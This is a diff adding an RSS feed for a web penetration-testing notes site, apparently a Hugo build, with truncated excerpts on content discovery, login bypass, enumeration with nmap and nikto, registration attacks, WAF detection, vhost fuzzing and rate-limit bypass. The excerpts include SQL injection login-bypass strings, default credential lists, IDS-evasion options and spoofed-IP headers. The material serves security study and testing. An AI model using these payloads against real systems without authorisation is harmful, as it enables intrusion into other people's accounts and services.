@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Method on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/web/method/</link>
+    <description>Recent content in Method on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 11:57:24 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/web/method/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Web Content Discovery</title>
+      <link>https://documentnation.github.io/docs/hdks/web/method/web-content-discovery/</link>
+      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/method/web-content-discovery/</guid>
+      <description>Manual Discovery link # Settings files /robots.txt /security.txt /.well-known/security.txt /.well-known/apple-app-site-association /.well-known/assetlinks.json /sitemap.xml /sitemaps.xml # JavaScript files /main.js /script.js /js/jquery.min.js /js/main.js /js/script.js # CGI scripts /cgi-bin/example.cgi # Wave dashes /~files/ /~hidden/ # PHP files /index.php /config.php /403.php /404.php # Python files /main.py /module.py /module/__init__.py /modules/__init__.py __init__.py config.ini project.wsgi # Archives /example.zip /backup.zip /backups.zip # Backup files /example.bak /example.jpg.bak /images/example.jpg.bak # Directories /admin/ /blog/ # Sensitive information /.env # GitHub /README.md /.git /.</description>
+    </item>
+    <item>
+      <title>Web Login Bypass</title>
+      <link>https://documentnation.github.io/docs/hdks/web/method/web-login-bypass/</link>
+      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/method/web-login-bypass/</guid>
+      <description>Common Default Credentials linkCheck if the website has not changed credential from the default username/password.&#xA;admin:admin admin:password admin:password1 admin:password123 admin:passw0rd admin:(empty) admin:12345 administrator:password administrator:password1 administrator:password123 administrator:passw0rd administrator:(empty) administrator:12345 # phpIPAM admin:ipamadmin Admin:ipamadmin # PHPMyAdmin root:(null) root:password SQL Injections link &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1 &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1-- or true-- &amp;#39; or true-- UNION SELECT null-- &amp;#39; UNION SELECT null-- &amp;#39; UNION SELECT 1,2-- Microsoft, Oracle, PostgreSQL link &amp;#39;-- &amp;#39; or 1=1-- &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- }&amp;#34; or 1=1-- MySQL link &amp;#39;-- - &amp;#39;# &amp;#39; or 1=1# &amp;#39; or 1=1-- - &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- - &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;# }&amp;#34; or 1=1-- - NoSQL Injection linkReference: https://portswigger.</description>
+    </item>
+    <item>
+      <title>Bypass Client/Server Side Filter</title>
+      <link>https://documentnation.github.io/docs/hdks/web/method/bypass-client-server-side-filter/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/method/bypass-client-server-side-filter/</guid>
+      <description>1. Disable Filter linkDisable Client-Side (JS) Filter link In Burp Suite, go to Proxy tab and click Options. Navigate to Intercept Client Requests section, then click on the top line (File extension&amp;hellip;) then click Edit. The popup will open. In the popup, find and remove |^js$ in Match condition, then save the filter. Disable Server-Side Filter link In Burp Suite, go to Proxy tab and click Options. Navigate to Intercept Server Requests section and check Intercept responses based on&amp;hellip;.</description>
+    </item>
+    <item>
+      <title>Web Basic Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/method/web-basic-pentesting/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/method/web-basic-pentesting/</guid>
+      <description>Enumeration link # Nmap nmap --script http-auth --script-args http-auth.path=/login -p 80,443 &amp;lt;target-ip&amp;gt; nmap --script http-devframework -p 80,443 &amp;lt;target-ip&amp;gt; nmap --script http-enum -p 80,443 &amp;lt;target-ip&amp;gt; nmap --script http-headers -p 80,443 &amp;lt;target-ip&amp;gt; nmap --script http-methods -p 80,443 &amp;lt;target-ip&amp;gt; # WHOIS whois example.com # Nikto nikto -h http://&amp;lt;target-ip&amp;gt; # -p: Specify ports nikto -p 80,3000 -h &amp;lt;target-ip&amp;gt; # -T: Tuning # 1: Interesting files # 2: Misconfiguration # 3: Information Disclosure # 4: Injection (XSS/Script/HTML) nikto -T 1 2 3 -h &amp;lt;target-ip&amp;gt; # -useragent: Custom user agent nikto -useragent &amp;lt;user-agent&amp;gt; -h &amp;lt;target-ip&amp;gt; # -e: IDS evasion # 1: Random URI encoding # 7: Change the case of URL nikto -e 1 7 -h &amp;lt;target-ip&amp;gt; # Whatweb whatweb &amp;lt;target-ip&amp;gt; # Aggression level (1-4) whatweb -a 3 &amp;lt;target-ip&amp;gt; # List all plugins whatweb -l # Search plugins whatweb -I apache whatweb -I phpBB whatweb -I phpmyadmin whatweb -I windows # Use plugin whatweb -p phpBB &amp;lt;target-ip&amp;gt; SSL Certificate linkIt may contain the sensitive information about the target company.</description>
+    </item>
+    <item>
+      <title>Web Registration Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/web/method/web-registration-attack/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/method/web-registration-attack/</guid>
+      <description>Register with the Same Username/Email Address as Existing User linkWe might be able to register the same username/email address as the existing user. It may affect the web server so be careful when testing.&#xA;Here are examples of username to register.&#xA;admin administrator root Alternatively, it’s worth to try various approach to register.&#xA;# Insert null byte admin%00 # Insert a space before username admin %20admin # Insert a space after username admin admin%20 # Insert spaces around username admin %20admin%20 # Overflow (we need to find the longest characters that can be registered) xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxadmin Malicious Usernames linkXSS linkWe might be able to inject XSS in username when registration.</description>
+    </item>
+    <item>
+      <title>Web Server Security Misconfiguration</title>
+      <link>https://documentnation.github.io/docs/hdks/web/method/web-server-security-misconfiguration/</link>
+      <pubDate>Thu, 12 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/method/web-server-security-misconfiguration/</guid>
+      <description>Checklist link The admin page allows non-admin users to access. Directory listing is enabled. Test environment is public. Default username and password. Admin’s password is easy to guess e.g. &amp;ldquo;admin&amp;rdquo;, &amp;ldquo;password123&amp;rdquo;, etc. The software is out of date or vulnerable version. Attacker-friendly error messages are displayed e.g. it reveals the software version. A cloud service provider (CSP) has default sharing permissions. Unsecure http protocol is used rather than https. Check CSP (Content-Security-Policy) linkWe can check if the CSP is vulnerable or not using online tools as below.</description>
+    </item>
+    <item>
+      <title>WAF (Web Application Firewall) Detection</title>
+      <link>https://documentnation.github.io/docs/hdks/web/method/waf-detection/</link>
+      <pubDate>Fri, 14 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/method/waf-detection/</guid>
+      <description>Automation link nmap --script=http-waf-fingerprint example.com wafw00f https://example.com </description>
+    </item>
+    <item>
+      <title>Virtual Hosts (VHOSTS) Enumeration</title>
+      <link>https://documentnation.github.io/docs/hdks/web/method/web-vhost-enumeration/</link>
+      <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/method/web-vhost-enumeration/</guid>
+      <description>Enumeration link # Ffuf ffuf -u http://example.com/ -H &amp;#34;Host: FUZZ.example.com&amp;#34; -w wordlist.txt -fs 1234 # follow redirect (-r) ffuf -u http://example.com/ -H &amp;#34;Host: FUZZ.example.com&amp;#34; -w wordlist.txt -fs 1234 -r # Sometimes, we have to specify the ip address not domain. ffuf -u http://10.0.0.1/ -H &amp;#34;Host: FUZZ.example.com&amp;#34; -w wordlist.txt -fs 1234 # Wfuzz wfuzz -u http://example.com -H &amp;#34;Host: FUZZ.example.com&amp;#34; -w wordlist.txt --hl 138 If we found vhosts, add them to the /etc/hosts in our machine.</description>
+    </item>
+    <item>
+      <title>HTTP Rate Limit Bypass</title>
+      <link>https://documentnation.github.io/docs/hdks/web/method/http-rate-limit-bypass/</link>
+      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/method/http-rate-limit-bypass/</guid>
+      <description>Bypass linkWe may be able to bypass the rate limiting by adding one of the following headers and change the IP per request.&#xA;Sometimes, we need to add multiple headers.&#xA;X-Forwarded: &amp;lt;IP&amp;gt; X-Forwarded-For: &amp;lt;IP&amp;gt; X-Forwarded-Host: &amp;lt;IP&amp;gt; X-Client-IP: &amp;lt;IP&amp;gt; X-Remote-IP: &amp;lt;IP&amp;gt; X-Remote-Addr: &amp;lt;IP&amp;gt; X-Host: &amp;lt;IP&amp;gt; X-Originating-IP: &amp;lt;IP&amp;gt; </description>
+    </item>
+  </channel>
+</rss>
